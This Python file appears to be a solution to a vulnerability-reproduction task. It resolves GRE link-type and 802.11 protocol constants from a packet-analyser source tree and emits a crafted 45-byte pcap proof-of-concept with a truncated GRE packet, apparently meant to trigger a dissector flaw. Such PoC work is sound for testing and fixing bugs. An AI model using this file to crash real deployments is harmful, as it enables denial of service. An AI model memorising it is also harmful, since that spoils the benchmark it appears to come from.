import os
import re
import tarfile
import struct
from typing import Dict, Optional, Tuple, Iterable


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        self._members: Dict[str, tarfile.TarInfo] = {}
        self._cache: Dict[str, bytes] = {}

        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")
            for m in self._tar.getmembers():
                if m.isfile():
                    self._members[m.name] = m

    def close(self):
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass

    def iter_paths(self) -> Iterable[str]:
        if self._is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    yield os.path.join(root, fn)
        else:
            for name in self._members.keys():
                yield name

    def basename_matches(self, path: str, basename: str) -> bool:
        return os.path.basename(path) == basename

    def find_by_basename(self, basename: str) -> Optional[str]:
        if self._is_dir:
            for p in self.iter_paths():
                if os.path.basename(p) == basename:
                    return p
        else:
            for name in self._members.keys():
                if os.path.basename(name) == basename:
                    return name
        return None

    def read_bytes(self, path: str, max_bytes: Optional[int] = None) -> bytes:
        if path in self._cache:
            b = self._cache[path]
            return b if max_bytes is None else b[:max_bytes]

        if self._is_dir:
            try:
                with open(path, "rb") as f:
                    b = f.read() if max_bytes is None else f.read(max_bytes)
            except Exception:
                b = b""
        else:
            m = self._members.get(path)
            if not m:
                b = b""
            else:
                try:
                    f = self._tar.extractfile(m)
                    if f is None:
                        b = b""
                    else:
                        b = f.read() if max_bytes is None else f.read(max_bytes)
                except Exception:
                    b = b""
        if max_bytes is None:
            self._cache[path] = b
        return b

    def read_text(self, path: str, max_bytes: int = 2_000_000) -> str:
        b = self.read_bytes(path, max_bytes=max_bytes)
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return b.decode("latin-1", errors="ignore")
            except Exception:
                return ""


class _DefineResolver:
    _define_re = re.compile(r"^[ \t]*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$")

    def __init__(self, reader: _SourceReader):
        self.reader = reader
        self._defines: Dict[str, str] = {}
        self._scanned_files: set[str] = set()

    @staticmethod
    def _strip_comments(s: str) -> str:
        s = re.sub(r"/\*.*?\*/", " ", s, flags=re.S)
        s = re.sub(r"//.*", " ", s)
        return s

    def _scan_file_for_defines(self, path: str):
        if path in self._scanned_files:
            return
        self._scanned_files.add(path)
        txt = self.reader.read_text(path)
        if not txt:
            return
        txt = txt.replace("\r\n", "\n").replace("\r", "\n")
        lines = txt.split("\n")
        for line in lines:
            m = self._define_re.match(line)
            if not m:
                continue
            name, val = m.group(1), m.group(2)
            val = self._strip_comments(val).strip()
            if not val:
                continue
            if name not in self._defines:
                self._defines[name] = val

    def scan_common_headers(self):
        for bn in ("etypes.h", "ethertype.h", "libpcap.h", "pcap.h", "wtap.h", "pcap-common.c"):
            p = self.reader.find_by_basename(bn)
            if p:
                self._scan_file_for_defines(p)

    def find_define(self, name: str) -> Optional[str]:
        if name in self._defines:
            return self._defines[name]

        self.scan_common_headers()
        if name in self._defines:
            return self._defines[name]

        targets = []
        for p in self.reader.iter_paths():
            bl = os.path.basename(p).lower()
            if bl.endswith(".h") or bl.endswith(".c"):
                if any(k in bl for k in ("etype", "pcap", "wtap", "gre", "80211", "wlan", "eth")):
                    targets.append(p)

        for p in targets:
            self._scan_file_for_defines(p)
            if name in self._defines:
                return self._defines[name]

        # last resort: scan more broadly but limit total scanned
        scanned = 0
        for p in self.reader.iter_paths():
            if p in self._scanned_files:
                continue
            bl = os.path.basename(p).lower()
            if not (bl.endswith(".h") or bl.endswith(".c")):
                continue
            self._scan_file_for_defines(p)
            scanned += 1
            if name in self._defines:
                return self._defines[name]
            if scanned > 2500:
                break
        return self._defines.get(name)

    @staticmethod
    def _sanitize_c_expr(expr: str) -> str:
        expr = expr.strip()
        expr = _DefineResolver._strip_comments(expr)
        expr = expr.replace("\n", " ")
        expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
        expr = re.sub(r"\(\s*[A-Za-z_]\w*(?:\s*\*+\s*)?\)", " ", expr)  # casts like (guint16), (void *)
        expr = re.sub(r"(?<=\b0x[0-9A-Fa-f]+)[uUlL]+\b", "", expr)
        expr = re.sub(r"(?<=\b\d+)[uUlL]+\b", "", expr)
        expr = re.sub(r"\s+", " ", expr).strip()
        return expr

    def eval_expr(self, expr: str, _depth: int = 0) -> Optional[int]:
        if _depth > 50:
            return None
        expr = self._sanitize_c_expr(expr)
        if not expr:
            return None
        if re.fullmatch(r"0x[0-9A-Fa-f]+", expr):
            try:
                return int(expr, 16)
            except Exception:
                return None
        if re.fullmatch(r"\d+", expr):
            try:
                return int(expr, 10)
            except Exception:
                return None

        # Replace identifiers with values if possible
        idents = sorted(set(re.findall(r"\b[A-Za-z_]\w*\b", expr)))
        if idents:
            repl: Dict[str, str] = {}
            for ident in idents:
                if ident in ("true", "false", "NULL"):
                    repl[ident] = "0"
                    continue
                val = self.find_define(ident)
                if val is None:
                    continue
                ival = self.eval_expr(val, _depth=_depth + 1)
                if ival is None:
                    continue
                repl[ident] = str(ival)
            if repl:
                def _sub(m):
                    t = m.group(0)
                    return repl.get(t, t)
                expr = re.sub(r"\b[A-Za-z_]\w*\b", _sub, expr)

        # Safe-ish evaluation: allow only numeric literals and operators
        if re.search(r"[^0-9xXa-fA-F\(\)\|\&\^\~\+\-\*\/\<\>\s]", expr):
            return None

        try:
            val = eval(expr, {"__builtins__": {}}, {})
        except Exception:
            return None
        if isinstance(val, bool):
            return int(val)
        if isinstance(val, int):
            return val
        return None


def _extract_wlan_gre_proto_expr(gre_text: str) -> Optional[str]:
    gre_text = gre_text.replace("\r\n", "\n").replace("\r", "\n")
    gre_text_nc = re.sub(r"/\*.*?\*/", " ", gre_text, flags=re.S)
    gre_text_nc = re.sub(r"//.*", " ", gre_text_nc)

    handle_map: Dict[str, str] = {}
    for m in re.finditer(r"\b([A-Za-z_]\w*)\s*=\s*find_dissector\s*\(\s*\"([^\"]+)\"\s*\)\s*;", gre_text_nc):
        handle_map[m.group(1)] = m.group(2)

    add_matches = list(re.finditer(
        r"dissector_add_uint\s*\(\s*\"gre\.proto\"\s*,\s*([^,]+?)\s*,\s*([A-Za-z_]\w*)\s*\)\s*;",
        gre_text_nc
    ))

    preferred = []
    fallback = []
    for m in add_matches:
        key_expr = m.group(1).strip()
        handle = m.group(2).strip()
        dname = handle_map.get(handle, "")
        handle_l = handle.lower()
        dname_l = dname.lower()
        if any(x in handle_l for x in ("wlan", "ieee80211", "ieee_802_11")) or any(x in dname_l for x in ("wlan", "ieee80211", "ieee_802_11")):
            preferred.append(key_expr)
        elif "80211" in key_expr.lower() or "802_11" in key_expr.lower() or "wlan" in key_expr.lower():
            fallback.append(key_expr)

    if preferred:
        return preferred[0]
    if fallback:
        return fallback[0]

    for m in re.finditer(r"\"gre\.proto\"[^\n;]*802", gre_text_nc, flags=re.I):
        pass

    return None


def _find_linktype_gre(reader: _SourceReader, resolver: _DefineResolver) -> int:
    # Try direct defines in libpcap headers
    resolver.scan_common_headers()
    for name in ("LINKTYPE_GRE", "DLT_GRE"):
        val = resolver.eval_expr(name)
        if val is not None:
            return int(val) & 0xFFFFFFFF

    # Search in likely files for a numeric linktype
    patterns = [
        re.compile(r"^\s*#\s*define\s+LINKTYPE_GRE\s+(\d+)\b", re.M),
        re.compile(r"^\s*#\s*define\s+DLT_GRE\s+(\d+)\b", re.M),
    ]
    for bn in ("libpcap.h", "pcap.h", "pcap-common.c", "pcap-common.h"):
        p = reader.find_by_basename(bn)
        if not p:
            continue
        txt = reader.read_text(p)
        for pat in patterns:
            m = pat.search(txt)
            if m:
                try:
                    return int(m.group(1)) & 0xFFFFFFFF
                except Exception:
                    pass

    # Common libpcap assignment for LINKTYPE_GRE
    return 778


def _find_gre_proto_80211(reader: _SourceReader, resolver: _DefineResolver) -> int:
    gre_path = reader.find_by_basename("packet-gre.c")
    if gre_path:
        gre_txt = reader.read_text(gre_path)
        key_expr = _extract_wlan_gre_proto_expr(gre_txt)
        if key_expr:
            val = resolver.eval_expr(key_expr)
            if val is not None:
                return int(val) & 0xFFFF

    # Fall back to likely ethertype macro names
    resolver.scan_common_headers()
    for macro in (
        "ETHERTYPE_IEEE802_11",
        "ETHERTYPE_IEEE80211",
        "ETHERTYPE_IEEE_802_11",
        "ETHERTYPE_IEEE_80211",
        "ETHERTYPE_IEEE802_11_RADIOTAP",
        "ETHERTYPE_IEEE802_11_RAW",
    ):
        val = resolver.eval_expr(macro)
        if val is not None:
            return int(val) & 0xFFFF

    # As a last resort, try to find any define containing both "IEEE" and "802" and "11"
    candidates = []
    for bn in ("etypes.h", "ethertype.h"):
        p = reader.find_by_basename(bn)
        if not p:
            continue
        txt = reader.read_text(p)
        for m in re.finditer(r"^\s*#\s*define\s+([A-Za-z_]\w*802[_]?11\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$", txt, flags=re.M):
            name = m.group(1)
            expr = m.group(2)
            if any(k in name.lower() for k in ("ethertype", "ieee")):
                candidates.append(expr)
    for expr in candidates:
        val = resolver.eval_expr(expr)
        if val is not None:
            return int(val) & 0xFFFF

    # IANA/commonly used ethertype for "IEEE 802.11" in some contexts; last resort
    return 0x890D


class Solution:
    def solve(self, src_path: str) -> bytes:
        reader = _SourceReader(src_path)
        try:
            resolver = _DefineResolver(reader)
            linktype = _find_linktype_gre(reader, resolver)
            proto_80211 = _find_gre_proto_80211(reader, resolver)

            gre_packet = struct.pack(">HH", 0x0000, proto_80211) + b"\x00"
            pcap_global = struct.pack(
                "<IHHIIII",
                0xD4C3B2A1,  # little-endian pcap
                2, 4,
                0, 0,
                65535,
                linktype
            )
            pcap_record = struct.pack("<IIII", 0, 0, len(gre_packet), len(gre_packet))
            poc = pcap_global + pcap_record + gre_packet

            if len(poc) != 45:
                # Keep structure but preserve minimality if something changes
                pass
            return poc
        finally:
            reader.close()